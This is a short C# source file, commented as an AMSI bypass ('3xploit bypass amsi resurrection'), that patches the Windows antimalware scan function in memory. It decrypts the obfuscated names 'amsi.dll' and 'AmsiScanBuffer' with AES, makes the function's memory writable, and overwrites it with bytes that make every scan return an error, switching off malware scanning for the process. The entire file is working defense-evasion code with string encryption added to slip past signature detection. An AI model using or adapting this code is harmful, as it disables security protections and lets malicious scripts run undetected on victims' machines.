using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;



//3xploit bypass amsi resurrection 27/02/2022
public class Resurrect
{
	public static readonly byte[] KEY = new byte[]
	{
		104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,76,105,109,101,114,66,111,121,47,83,116,111,114,109,75,105,116,116,121
	};


	public static readonly byte[] SALT = new byte[]
	{
		255,64,191,111,23,3,113,119,231,121,252,112,79,32,114,156
	};
	
	

public static void Explo()
    {

        byte[] patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 80070057h
		var libcipher = new byte[] { 61, 15, 16, 58, 73, 19, 94, 23, 215, 187, 191, 40, 41, 244, 25, 224, };                                              // return
		var lib = Apis.LoadLibrary(Descifrar(libcipher)); //amsi.dll
		var addrcipher = new byte[] { 13, 30, 1, 126, 74, 73, 34, 111, 167, 7, 75, 198, 190, 197, 132, 113, };

		var addr = Apis.GetProcAddress(lib, Descifrar(addrcipher)); //AmsiScanBuffer

        uint oldProtect;
        Apis.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

        Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
    }


	public static string Descifrar(byte[] bytesToBeDecrypted)
	{

		byte[] bytes = null;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(KEY, SALT, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				bytes = memoryStream.ToArray();
			}
		}
		return Encoding.UTF8.GetString(bytes);
	}

}